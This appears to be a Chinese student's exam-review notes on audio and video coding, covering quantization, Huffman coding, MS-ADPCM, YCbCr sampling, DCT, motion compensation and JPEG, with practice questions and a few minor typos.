<p>[!hint] 考点 7：CD 的数据率</p>
</blockquote>
<p>CD 的数据率：44.1k/s × 16 bit × 2 =<span style="color:#ff0000"> 1.4112 Mb/s</span></p>
<ul>
<li>采样：时间间隔 0.023ms（1/0.000023≈43.5k）或采样频率 <strong>44.1k。</strong></li>
<li>每一个采样的比特数为 16bit，这种精度允许 65536 个离散电平来表示音频采样幅度。</li>
<li>2 个通路</li>
</ul>
<h2>潜在的编码错误</h2>
<blockquote>
<p>[!hint] 考点 9：潜在的编码错误</p>
</blockquote>
<ul>
<li>采样错误——混叠效应（抽样速率小于二倍带宽）</li>
<li>🔺<span style="color:#ff0000">量化错误：过载错误、截断错误（round-off）</span></li>
<li>比特错误：存储和传输错误</li>
</ul>
<h2>更复杂的编码器</h2>
<p>心理声学表明，每个样本理想采样比特为 18-20bits 来描述中等频率（2~5kHz）的音频样本。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130608.webp" alt="image.png|500"></p>
<p>冗余：感知冗余、统计冗余</p>
<blockquote>
<p>[!hint] 考点 10：有损压缩和无损压缩</p>
</blockquote>
<h2>有损压缩</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130629.webp" alt="image.png"></p>
<p><strong>有损压缩通过量化来实现。</strong></p>
<h3>量化</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130648.webp" alt="image.png|500"></p>
<p>如果有 R 比特可以表示的最大数为 $2^R$，两种量化方法表示的不同样本/编码数为：</p>
<ul>
<li>midtread 中平：$2^R-1$，一般来说效果较好，噪声抑制（小电频通常为噪声，Midtread 会过滤掉）</li>
<li>midrise 中升：$2^R$，噪声放大</li>
</ul>
<blockquote>
<p>[!hint] 考点 11：均匀量化和非均匀量化</p>
</blockquote>
<h4>均匀量化 Uniform Quantization</h4>
<p>定义输入范围所需要的信息：</p>
<ul>
<li>量化器是 midtread 还是 midrise</li>
<li>最大不过载的输入 $x_{max}$</li>
<li>描述编码的比特数 R</li>
</ul>
<p>R 比特允许我们设置的输入范围：</p>
<ul>
<li>midrise：$\Delta=2*x_{max}/2^R$</li>
<li>midtread：$\Delta=2*x_{max}/(2^R-1)$</li>
</ul>
<h4>非均匀量化 Nonuniform Quantization</h4>
<p>均匀量化会存在截断误差（最大值为 $\Delta/2$)，但是，相对于非常低的幅度信号，此误差可能会很大。<strong>由于截取失真的感知与相对误差更相关，因此这意味着均匀量化器在低功率输入信号上的表现要比在高功率信号上的差得多。</strong> 要解决此问题，可以使用非均匀量化。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102130912.webp" alt="image.png|350"></p>
<p>压缩方法：</p>
<ul>
<li>幂律压缩：$c_{power}(|x|)=|x|^p，0&lt;p&lt;1$, (ACC 或 MP3 中 p=0.75）</li>
<li>对数压缩</li>
</ul>
<p>量化错误 Quantization Errors：</p>
<ul>
<li>量化误差：$q(t)=x_{out}(t)-x_{in}(t)$</li>
<li>信噪比 SNR（Signal-to-noise ratio） $SNR=10 \log{\frac{x_{in}^2}{q^2}}$</li>
<li><strong>低 量化误差 对应于 高 信噪比</strong></li>
</ul>
<p>截断错误 Round-off Error：产生于将一定范围的信号振幅输入对应到单一编码中</p>
<p>过载错误 Overload Error：</p>
<ul>
<li>出现原因：量化器接收的信号振幅（绝对值）过大</li>
<li>导致爆鸣（突突突的声音），为了避免它，通常把 $x_{max}$ 设置得足够大，但由于 R 比特数固定，这会导致截断错误。量化器设计要求在减少两种类型的误差之间取得平衡。</li>
</ul>
<p>过载错误、截断错误属于量化错误。</p>
<h2>无损压缩：熵编码</h2>
<blockquote>
<p>[!hint] 考点 12：熵和哈夫曼编码</p>
</blockquote>
<p>翻译量化编码为一些代表符号，每个符号使用了一定数量的比特。</p>
<p>使一般的编码更短，从而降低平均的比特率。这需要估计每一个可能编码出现的概率。</p>
<p>比特率计算：$R = \sum_{i=1}^n{p_i \cdot L_i}$，其中 $p_i$ 表示编码出现的概率，$L_i$ 表示编码后的长度。</p>
<p><span style="color:#ff0000">熵代表了编码的极限：</span></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231126174729.webp" alt="image.png"></p>
<p><strong>当我们能确保下一个输出编码是什么时，熵会变低；反之变高。</strong></p>
<p>例：在 2 编码符号系统中，有</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102131253.webp" alt="image.png"></p>
<p>数学图像 <a href="https://www.desmos.com/calculator/fkd2gp4jc5?lang=zh-CN">链接</a></p>
<ul>
<li>当 p=0 或 1 时，熵为 0。我们知道下一个编码是什么，所以我们不需要发送任何 Bits。</li>
<li>当 p=0.5，熵为 1。当所有编码符号出现的概率相同时，达到最大熵。在这种情况下使用熵编码进行压缩没有效果。</li>
<li>对于其他概率，存在一种编码方式使得平均符号编码使用小于 1 个比特</li>
</ul>
<h3>哈夫曼编码</h3>
<p>被用于传真、ASCII 文本数据编码压缩。</p>
<p>是一种统计学编码，平均编码长度最小。</p>
<p>编码长度可变，且越经常使用的字符编码长度越短。</p>
<p>特点：</p>
<ol>
<li>编码过程不唯一（取决于分支的标记或合并符号的选择），但 WPL 相同（在这里指的是比特率 R）且最优</li>
<li>在符号分布概率不均匀的情况下，哈夫曼编码的比特数比固定比特编码方法少</li>
<li>霍夫曼码中每个样本的平均位数在熵的一位以内，即平均采样比特数范围：$$Entropy\le <R>_{Huffman} \le Entropy + 1$$</li>
</ol>
<h2>WAVE MS-ADPCM</h2>
<blockquote>
<p>[!hint] 考点 13：MS-ADPCM</p>
</blockquote>
<p>DPCM 差分脉冲编码调制：</p>
<ul>
<li>以 PCM 为基线，增加了预测采样信号的功能。</li>
<li>与 PCM 直接传输原始 PCM 采样不同的是，DPCM 传输的是原始采样信号与预测值（基于先前采样）之间的差异：$diff=x_{n+1}-xp_{n+1}$</li>
<li>预测值计算举例：$xp_{n+1}=a<em>x_n+b</em>x_{n-1}$，a、b 为预测系数</li>
</ul>
<p>diff 通常非常小，我们必须限制它的表示范围，如从 16bits 限制到 4bits。但我们也不能保证 diff 总是小的（如剧烈信号变化），为了解决这个问题，引入了 iDelta。如果 diff 非常大，则 iDelta 也会很大，反之亦然。</p>
<p>于是我们定义：$iErrordata = diff / iDelta$，这样新的差异值将会稳定。</p>
<p>iErrordata 以 4bit 保存，称为「nibble」，范围为 -8~7。每次新的 iErrordata 生成后，iDelta 相应做出改变。</p>
<pre><code class="language-C">iDelta = iDelta * AdaptableTable[(unsigned)nibble]/256;
const int AdaptationTable[ ] = {
230, 230, 230, 230, 307, 409, 512, 614,    // 对应nibble：
768, 614, 512, 409, 307, 230, 230, 230 };  // 对应nibble：
</code></pre>
<h3>WAVEFORMAT</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231105205607.webp" alt="image.png"></p>
<p>MS-ADPCM 的 wave 文件中，存在与 fmt 块和 data 块的另一种块：fact 块</p>
<ul>
<li>fact 块存储采样长度</li>
<li>data 块中，数据以块的方式存储，一个接着一个</li>
<li>块有三个部分：头、数据和填充</li>
</ul>
<h3>编码过程</h3>
<p>对于每个通道的每个块的编码过程：</p>
<ol>
<li>决定块要使用的预测器</li>
<li>决定块的初始 idelta</li>
<li>输出块的头</li>
<li>编码并输出数据</li>
</ol>
<p>块头写入：</p>
<ol>
<li>对每一个通道，输出预测器的选择</li>
<li>对每一个通道，输出初始 idelta (量化比例)</li>
<li>对每一个通道，输出第一个采样的 16bit PCM 值</li>
<li>对每一个通道，输出第二个采样的 16bit PCM 值</li>
</ol>
<p>然后剩下的块就可以进行编码。<strong>注意第一个编码的值是块的第三个采样，因为前两个已经包含在头中了。</strong></p>
<p>当块中有许多采样需要进行编码，将采取下列步骤：</p>
<ol>
<li>从前两个采样中预测下一个样本：<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231123215918.webp" alt="image.png"></li>
</ol>
<blockquote>
<p>用预测系数计算会导致运算量增长，而除以 256 只需要移位，无浮点数除法</p>
</blockquote>
<ol start="2">
<li>产生 4bit 有符号 error delta 以及避免上/下溢：$$ierrordelta=\frac{sample(n)-Ipredsamp}{idelta}$$ 并将 ierrordelta 的范围修剪至[-8,7]</li>
<li>于是输出 nibble ierrordelta=<code>putnibble(ierrordelta)</code></li>
<li>把「预测错误」加到预测的下一个样本，并避免上/下溢：$$Inewsamp=Ipredsample+(idelta*ierrordelta)$$ 将其缩紧至 16bit（short）</li>
<li>调整用于计算「预测错误」的量化步长：$$idelta=\frac{idelta*adaptiontable[ierrordelta]}{fixed_point_adaption_base}$$ 如果 idelta 过小，将其设为最小的合法值</li>
<li>更新先前样本的记录：$$isamp2 = isamp1; isamp1 = Inewsample$$<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231102131901.webp" alt="image.png"><br>
步骤 5 的目的是自适应量化步长。<br>
步骤 4.6 是为了保持和解码端一致，真正预测时是通过编码解码后的信号。此时和解码端保持一致，使误差不会太大。</li>
</ol>
<blockquote>
<p>[!Example] 习题助记<br>
1.What is audio CD rate?<br>
44.1KHZ × 2 × 16bit/s = 1.411 Mbit<br>
2.What are audio coding goals?<br>
delity，rate，complexity，delay<br>
3.List the components of a chunk.<br>
header，data<br>
4.What kind of quantization errors are there in audio coding?<br>
overlode，round-off<br>
5.What is the average number of bits per sample in a Huffman code?</p>
</blockquote>
<h1>图片和视频编码基础</h1>
<p>🔺人类视觉系统对低频图像更敏感。</p>
<blockquote>
<p>图形学中的高低频：图像的低频代表着轮廓信息，高频代表着细节信息，相位代表位置信息。</p>
</blockquote>
<p>特定自然视频片段中与视频处理和压缩相关的特征：</p>
<ul>
<li>空间特征：纹理变化、物体对象的数目和形状、颜色</li>
<li>时间特征：物体运动、光线变化、摄像机/视角变化</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102195839.webp" alt="image.png"></p>
<p>帧率：</p>
<ul>
<li>每秒小于 10 帧：用于超低比特流视频通信</li>
<li>10~20 帧：典型低比特率视频通信</li>
<li><strong>25~30 帧：电视图像标准</strong></li>
<li>50~60 帧：平滑（高数据率）</li>
</ul>
<blockquote>
<p>[!hint] 考点 23：色彩空间</p>
</blockquote>
<p>色彩空间：</p>
<ul>
<li>单色图：仅需一个数字表示某一个空间采样的亮度</li>
<li>彩色图：至少需要三个数字才能准确表示某一个像素的颜色</li>
</ul>
<p>代表亮度和色彩的方法称为色彩空间：</p>
<ul>
<li>RGB 色彩空间：捕获和显示图像的恰当方法。RGB 色彩空间中三种颜色同样重要，通常分辨率也相同。彩色阴极射线管（CRT）和液晶显示器（LCD）应用 RGB。</li>
<li>YCbCy 色彩空间（YUV 色彩模型）</li>
</ul>
<p><strong>图像的视觉质量受采样点数量的影响。</strong></p>
<h2>YCbCr</h2>
<p>🔺<span style="color:#ff0000">人类视觉系统对<b>亮度</b>更敏感（和颜色相比）</span></p>
<blockquote>
<p>人眼的视杆细胞（感知亮度）比视锥细胞（感知色彩）数量多。</p>
</blockquote>
<h3>色彩空间</h3>
<p>在 RGB 颜色空间中，这三种颜色同等重要，因此通常都以相同的分辨率存储。</p>
<p>YCbCr 区分亮度和色度，亮度具有更高的分辨率。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231106221610.webp" alt="image.png|500"></p>
<p>Y：亮度（luma），RGB 的加权平均，$Y=k_rR+k_gG+k_bB, k_g = 1-k_b-k_r$</p>
<p>Cb：彩度蓝</p>
<p>Cr：彩度红</p>
<p>每一个色度是 R、G、B、Y 之间的差异</p>
<p>为了降低存储和传输需求，可以将 RGB 图像转换为 YCbCr 图像</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102195927.webp" alt="image.png"></p>
<p>ITU-R 建议的系数定义：$k_b=0.114, k_r=0.299$</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200018.webp" alt="image.png"></p>
<h3>采样格式</h3>
<p>为了利用人眼对亮度和色度的不同敏感性，将视频信号转换为亮度/色彩空间时，可以对色度进行空间上的次采样或低通滤波</p>
<h4>4:4:4 采样</h4>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200027.webp" alt="image.png|205"></p>
<p>Y，Cb 和 Cr 有着相同的分辨率。因此每一个分量存在于任何位置的像素上</p>
<h4>4:2:2 采样</h4>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200042.webp" alt="image.png|187"></p>
<p>色度组件的垂直分辨率与亮度相同，但水平分辨率只有亮度的一半。</p>
<p>用于高质量彩色录制。</p>
<h4>4:2:0 采样</h4>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200051.webp" alt="image.png"></p>
<p>Cb 和 Cr 的水平和垂直分辨率都是 Y 的一半。</p>
<p>广泛用于消费类应用，如视频会议、DVD。</p>
<p><strong>需要的采样数（比特）是 4:4:4 视频（或 RGB 视频）的一半</strong>。</p>
<blockquote>
<p>为什么不叫做 4:1:1 采样？<br>
因为在历史上 4:1:1 采样已被用于指代这种采样：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200109.webp" alt="image.png|275"></p>
</blockquote>
<p>例子：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200139.webp" alt="image.png|375"></p>
<h2>视频帧格式</h2>
<blockquote>
<p>[!hint] 考点 24：视频帧格式</p>
</blockquote>
<p>在进行压缩和传输之前，捕获的视频会被捕获或转换为一组“中间格式”之一。</p>
<p>常见的中间格式（CIF）是一组流行格式的基础。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200202.webp" alt="image.png|375"></p>
<h2>质量评估</h2>
<h3>主观测量——ITU-R 500</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200215.webp" alt="image.png"></p>
<p>通常采用的手段：双刺激连续质量量表（Double Stimulus Continuous Quality Scale）</p>
<p>花费昂贵，耗时长</p>
<h3>客观质量测量</h3>
<blockquote>
<p>峰值信噪比 ( PSNR ) 用于表示信号的最大可能功率与影响其表示的保真度的破坏噪声的功率之间的比率。虽然较高的 PSNR 通常表明重建质量较高，但在某些情况下可能并非如此，必须非常小心该指标的有效性范围。只有当它用于比较来自相同编解码器和相同内容的结果时，它才是最终有效的。一般来说，在估计图像质量，尤其是人类感知的视频质量时，与其他质量指标相比，PSNR 表现不佳。</p>
</blockquote>
<p>运用最广泛的是<strong>峰值信噪比（Peak Signal to Noise Ratio, PSNR）</strong></p>
<p>$$<br>
\begin{aligned}<br>
{PSNR}<em>{dB} =&amp; 10 \log</em>{10}{\frac{(2^n-1)^2}{MSE}} \<br>
SNR=&amp;10 \log{\frac{x_{in}^2}{q^2}}<br>
\end{aligned}<br>
$$</p>
<p>MSE：原始图像和受损图像或视频帧之间的均方误差</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200250.webp" alt="image.png|475"></p>
<h2>图像视频处理准则</h2>
<blockquote>
<p>[!hint] 考点 25：图像视频处理准则：四种类型冗余度</p>
</blockquote>
<p>目标是减少信号中存在的冗余（🔺视频编码的四种冗余度）：</p>
<ul>
<li>时间冗余度（Temporal redundancy）：两帧相像</li>
<li>空间冗余度（Spatial redundancy）：两点相像</li>
<li>统计冗余度（Perceptual redundancy）</li>
<li>感知冗余度（Statistical redundancy）</li>
</ul>
<h2>JPEG 图像压缩</h2>
<p>基本流程：</p>
<ul>
<li>在 JPEG 压缩中，图像被划分为 8×8 像素的块，然后对每个块进行 2-D 离散余弦转换（DCT）。</li>
<li>DCT 将像素块中的大多数信号压缩为小的 DCT 系数部分。</li>
<li>量化这些 DCT 系数将使得它们大部分转化为 0。</li>
<li>这些被量化的系数以之字形进行扫描，再进行游程编码和哈夫曼编码。</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200322.webp" alt="image.png"></p>
<h2>帧内帧间预测</h2>
<p>每一帧可以都被编码为分开的图像，例如对每一帧独立应用类似 JPEG 的编码。</p>
<p>视频压缩通过利用时间冗余或帧间相似性达到比图片更好的压缩效果。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200334.webp" alt="image.png"></p>
<blockquote>
<p>[!hint] 考点 26：视频编码中，编码帧的三种基本类型</p>
</blockquote>
<p>🔺编码帧的三种基本类型：</p>
<ul>
<li>帧内编码帧（I - 帧）：独立于于所有其他帧进行编码</li>
<li>预测编码帧（P - 帧）：基于先前编码的帧进行编码</li>
<li>双向预测帧（B - 帧）：基于先前帧和未来帧进行编码</li>
</ul>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200349.webp" alt="image.png"></p>
<h2>运动估计与补偿</h2>
<blockquote>
<p>[!hint] 考点 27：运动估计和补偿</p>
</blockquote>
<p>为了最大限度利用相邻帧的可预测性，在运动补偿过程中估算两帧之间的移动并形成正确预测是非常重要的。</p>
<p>估计帧与帧之间运动的过程称为运动估计；基于先前编码的参考帧预测给定帧，同时补偿两帧之间的相对运动的过程称为运动补偿预测 (MC-prediction)。</p>
<h3>基于块的的运动估计补偿</h3>
<p>对于当前帧 M×N 样本的每个块：</p>
<ol>
<li>在参考帧中搜索一个区域，以找到一个“匹配”的 M×N 样本区域</li>
<li>被选中的候选区域称为当前块的预测块，并将其与当前块相减，得到残差</li>
<li>将残差块编译传输，当前块和候选位置区域之间的偏移（运动向量）也将被传输</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200446.webp" alt="image.png"></p>
<h3>运动补偿块的大小</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200456.webp" alt="image.png"></p>
<h3>子像素运动补偿</h3>
<p>一个更好的运动补偿预测可以由参考帧中的差值样本位置构建。</p>
<p>分像素运动估计补偿引入查找分样本差值位置和整样本位置，选择最匹配的位置，并使用该位置的整数或子样本值进行运动补偿预测。</p>
<p>过程：</p>
<ol>
<li>在整样本网格（圆圈标记）中找到最佳匹配</li>
<li>搜索紧挨着最佳匹配（方块标记）的半样本位置。</li>
<li>如果需要，则搜索最佳半样本位置（三角形标记）旁边的四分之一样本位置</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200508.webp" alt="image.png"></p>
<p>预测越精确，残差越小，motion vector 数据量增加。</p>
<p>随着插补步骤的增加，性能增益趋于减小：</p>
<ul>
<li>与整样本运动补偿相比，半样本插值具有显著的增益。</li>
<li>四分之一样本插值有一定适度改进。</li>
<li>8 个样本插值改进更小，以此类推。</li>
</ul>
<p>与更复杂的运动补偿方案相关的压缩效率权衡：<strong>更精确的运动补偿需要更多的比特来编码向量域，但编码残差比特数更少；反之亦然。</strong></p>
<h2>图像模型</h2>
<ol>
<li>转换：压缩数据并去相关</li>
<li>量化：降低传输数据的精确度</li>
<li>重新排序：组织数据以合并重要值</li>
<li>预测图像编码</li>
</ol>
<h3>预测图像编码</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200520.webp" alt="image.png"></p>
<p>空间预测，以 DPCM 为例：</p>
<ol>
<li>编码预测：prediction P(X) = (2A+B+C)/4</li>
<li>残差计算：R(X) = X-P(X) ，然后编码并传输 R(X)</li>
<li>解码器解码残差并形成预测：P(X) = (2A+B+C)/4</li>
<li>重建像素：X = R(X) + P(X)</li>
</ol>
<h3>转换编码</h3>
<p>转换后的数据应当去相关且被压缩：在转换后的数据中，大多数的信息应当被集中于少量的值中。</p>
<p>转换应当可逆。</p>
<p>转换应当容易计算：低内存需求、可使用有限精度算法实现、算数操作数低</p>
<p>目前有许多转换：KLT，SVD，DCT</p>
<p>在 N×N 样本块中，DCT 始终受欢迎，且图像一直在块单元中被处理。</p>
<p>运动补偿残差往往会受到块边缘的伪影（blockiness）的影响。</p>
<p>对整个图像或帧做的基于图像的转换操作有：</p>
<ul>
<li>图像传输（离散小波变换 DWT）胜过静态图像压缩的块传输（JPEG2000）</li>
<li>DWT 需要更高的内存需求（尤其是大图像），因为是以整个图像作为一个单元处理图像的</li>
<li><strong>DWT 并不“适合”基于块的运动补偿</strong></li>
</ul>
<h4>2D-DCT</h4>
<p>正向离散余弦转换：$Y=AXA^T$</p>
<p>逆 DCT（IDCT）：$X=A^TYA$</p>
<p>X 为 N×N 样本块，Y 为系数矩阵，A 为 N×N 传输矩阵</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200620.webp" alt="image.png"></p>
<p>例子：N=4，有 A：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200637.webp" alt="image.png"></p>
<h4>DCT 系数的特征</h4>
<p>FDCT 输出是一组 N×N 的系数，表示 DCT 域中的图像块数据。</p>
<p>DCT 自身保存所有 N×N 图像块中的信息。</p>
<p>人眼对低频 DCT 参数更加敏感。</p>
<p>DCT 有助于将感知上重要的信息与感知上不重要的信息分离开来。</p>
<p><strong>用更高的精度编码低频的 DCT 信息，但使用更少或不使用比特来编码高频系数，从而丢弃在感知上不太重要的信息。</strong></p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102200648.webp" alt="image.png"></p>
<p>在计算 IDCT 之前添加更多的系数，会逐渐提高原始区块的重建精度，到包含五个系数时，重建的区块与原始区块的匹配程度相当接近。</p>
<p>可以从 16 个 DCT 系数的子集中重建块的近似副本。</p>
<h4>DCT 计算复杂性</h4>
<p>在典型的 DSP 上，单个 8×8 DCT 或 IDCT 需要几百个指令周期。</p>
<p>以 CIF (352×288) 分辨率和 30 fps 帧率运行的解码器可能需要高达 71,280 IDCT /秒。</p>
<p>IDCT 计算可占用高达 30% 的视频解码器编译周期。</p>
<p>由于 DCT 和 IDCT 在小图像块上操作，因此内存需求相当小，与图像和视频压缩应用程序中的帧缓冲区和其他数据的大小相比，通常可以忽略不计。</p>
<p>DCT 和 IDCT 函数的<strong>高计算需求和小内存需求</strong>使它们成为使用专用硬件加速器实现的理想候选者。</p>
<h3>量化</h3>
<p>$$<br>
\begin{aligned}<br>
FQ = &amp;round\left( \frac{X}{QP} \right) \<br>
Y=&amp;FQ\cdot QP<br>
\end{aligned}<br>
$$</p>
<p>QP 表示量化步长。</p>
<p>量化用于<strong>丢弃感知上不重要的信息</strong>。</p>
<p>量化后，使用统计方法对剩余信息进行编码，从而使用尽可能少的比特。</p>
<p>量化和去量化对内存的要求通常可以忽略不计。</p>
<h3>游程编码（RLC）</h3>
<p>量化后，绝大多数高频 DCT 系数为零。</p>
<p>游程编码：</p>
<ul>
<li>将连续的 0 值系数成组（一个游程）</li>
<li>编码 0 的个数（长度），不编码单独 0 系数</li>
</ul>
<p><strong>为了使连续零值系数的平均值尽可能高</strong>，我们以对角之字形的方式扫描 DCT 系数矩阵。</p>
<p>游程编码（RLC，Run-length coding）之后通常是可变长度编码（VLC）。</p>
<h3>重新排序</h3>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201034.webp" alt="image.png|278"></p>
<p><strong>重排序是将非零系数组合在一起，实现有效地表示零系数</strong></p>
<h3>可变长度编码（VLC）</h3>
<p>一对（游程，量化 DCT 系数）的每个可能值称为一个符号。</p>
<p>常见的符号被分配较短的码字，而不常见的符号被分配较长的码字。</p>
<p>VLC 的一个缺点是编码图像中间的比特误差会阻止解码器正确重建剩余的比特流。</p>
<p>通过在整个编码比特流中散布“重新同步标记”，解码器能够在发生错误时搜索下一个重新同步标记以进行同步。</p>
<h2>视频编码结构</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201058.webp" alt="image.png"></p>
<h2>通用视频编码模型</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201109.webp" alt="image.png"></p>
<h2>编码数据流</h2>
<p>编码器的两个主要的数据流路径：从左到右（编码）、从右到左（重建）。</p>
<p>编码流：</p>
<ol>
<li>输入视频帧 Fn 用于编码，并以宏块为单位进行处理</li>
<li>Fn 和参考帧（如前编码帧 F'n-1）对比。运动估计函数在 F'n-1 中 16×16 的区域，查找出一个 Fn 中当前宏块的一个匹配。当前宏块位置和被选中的参考区域的偏移为一个移动向量（MV，motion vector）</li>
<li>基于被选中的 MV，生成运动补偿预测 P（被运动估计器选择的 16×16 区域）</li>
<li>当前宏块中减去 P 产生残差或 difference 宏块 D。</li>
</ol>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201156.webp" alt="image.png"></p>
<p>数据重建流：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201207.webp" alt="image.png"></p>
<h2>解码数据流</h2>
<p>解码数据流：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201222.webp" alt="image.png"></p>
<blockquote>
<p>[!Example] 习题助记</p>
<ol>
<li>Write down the full name of ADPCM in English<br>
Adaptive Differential Pulse Code Modulation</li>
<li>List the four types of redundancy used in video coding<br>
时间、空间、感知、统计</li>
<li>What is the sample resolution of CIF<br>
352×288</li>
<li>Write down the formula of PSNR</li>
<li>ln video coding , there are three basic types of coded frames, what are they?<br>
I P B</li>
<li>What is the purpose of DCT?<br>
去相关，使数据更紧凑</li>
<li>What is the purpose of Zigzag Scan or reordering?<br>
是将非零系数组合在一起并有效地表示零系数</li>
<li>What is the purpose of quantization?<br>
量化用于丢弃感知上无关紧要的信息</li>
<li>In motion estimation and compensation, what kind of redundancy is used in video coding?<br>
temporal 时间冗余</li>
<li>In 010 editor template, the following variable is defined at the beginning: char type[4];<br>
The variable type is mapped to 0 bytes 3 to in the file.</li>
</ol>
</blockquote>
<h2>本小节参考链接</h2>
<ul>
<li><a href="https://blog.csdn.net/Doctor__Chen/article/details/124781119">质量评估指标：PSNR（Peak signal-to-noise ratio 峰值信噪比）_psnr指标_花生树什么树的博客-CSDN博客</a></li>
<li><a href="https://www.zhihu.com/question/22085329/answer/774074211">傅里叶变换、拉普拉斯变换、Z 变换的联系是什么？为什么要进行这些变换？ - 知乎 (zhihu.com)</a></li>
</ul>
<h1>JPEG 图像编码</h1>
<p><strong>Baseline 方法是迄今为止实现最广泛的 JPEG 方法。</strong></p>
<h2>基于 DCT 的编码/解码过程</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102201904.webp" alt="image.png"></p>
<p>编码过程：</p>
<ol>
<li>输入的组件样本为 8×8 块</li>
<li>每个块被前向 DCT（FDCT）转换为一组 64 个值，作为 DCT 系数。<br>
a. 第一个值称为 DC 系数<br>
b. 其他 63 个值为 AC 系数</li>
<li>然后使用量化表中 64 个对应值中的一个对 64 个系数中的每个系数进行量化</li>
<li>然后将量化系数传递给熵编码过程，以进一步压缩</li>
</ol>
<p>解码过程：</p>
<ol>
<li>熵解码器解码之字形的量化 DCT 系数</li>
<li>解量化后，通过反向 DCT（IDCT）将 DCT 系数转化为 8*8 样本块</li>
</ol>
<h2>前向 DCT（FDCT）</h2>
<p>在编码器的输入中，原图像采样以 8×8 块成组，从无符号整数 $[0,2^P-1]$ 的范围转换为有符号整数 $[-2^{P-1},2^{P-1}-1]$，然后输入到 FDCT 中：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231123215755.webp" alt="image.png"></p>
<p>其中，</p>
<p>$$<br>
\begin{aligned}<br>
C(u),C(v)=&amp;1/\sqrt{ 2 }, &amp;when~u,v=0\<br>
C(u),C(v)=&amp;1,&amp;other~conditions<br>
\end{aligned}<br>
$$</p>
<h2>反向 DCT（IDCT）</h2>
<p>解码器的输出中，IDCT 输出 8×8 采样块以形成重构图片：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231123215702.webp" alt="image.png"></p>
<p>其中，</p>
<p>$$<br>
\begin{aligned}<br>
C(u),C(v)=&amp;1/\sqrt{ 2 }, &amp;when~ u,v=0\<br>
C(u),C(v)=&amp;1,&amp;other ~conditions<br>
\end{aligned}<br>
$$</p>
<h2>块样本和 DCT 系数的关系</h2>
<ul>
<li>对一个块进行前向 DCT 计算后，64 个 DCT 系数结果被均匀量化器量化</li>
<li>每一个系数 $S_{vu}$ 的量化器步长为对应量化表中的元素 $Q_{vu}$<br>
<img src="https://cdn.gallery.uuanqin.top/img/20231102202014.webp" alt="image.png"></li>
</ul>
<h2>DC 编码</h2>
<p>相邻的 8×8 块之间的 DC 系数通常有着强烈的关联性。量化的 DC 系数被编码为与前块的 DC 项的差值。这种特殊处理是值得的，因为 DC 系数包含了总图像能量的很大一部分。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202041.webp" alt="image.png"></p>
<h2>之字形扫描</h2>
<p>所有的量化系数将以之字形顺序进行组织，将低频系数（一般为非 0）放置在高频系数前，以便于进行熵编码。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202052.webp" alt="image.png"></p>
<h2>压缩与图像质量</h2>
<p>对于较复杂场景的彩色图像，所有基于 DCT 的操作模式通常会产生以下级别的图像质量：</p>
<ul>
<li>0.25-0.5 比特/像素：中等至良好质量</li>
<li>0.5-0.75 比特/像素：良好至优秀质量</li>
<li>0.75-1.5 比特/像素：杰出质量，满足大多数的应用</li>
<li>1.5-2.0 比特/像素：和原图相差无几，满足有高质量需求的应用</li>
</ul>
<p>根据源特性和场景内容的不同，质量和压缩会有很大的不同。</p>
<h2>具有多个组件的源图像</h2>
<p>源图像可能包含 1~255 个图像组件。每一个组件包含样本的矩形数组。</p>
<p>样本被定义为一个 $[0, 2^{P-1}]$ 范围的无符号整数。</p>
<p>图像中的所有样本必须有着相同的精度 P，对于基于 DCT 的编解码器，P 可以是 8 或 12。</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202132.webp" alt="image.png"></p>
<h2>多组件交织</h2>
<p>许多应用程序需要将显示/打印多组件图像的过程与解压过程并行。</p>
<p>这只有在组件在压缩数据流中交织在一起时才可行。</p>
<p>编码交错：如果编码器从 a 压缩一个数据单元，从 B 压缩一个数据单元，从 C 压缩一个数据单元，然后返回到 a......</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202143.webp" alt="image.png"></p>
<h2>不同维度的组件交织顺序</h2>
<p><img src="https://cdn.gallery.uuanqin.top/img/20231102202151.webp" alt="image.png"></p>
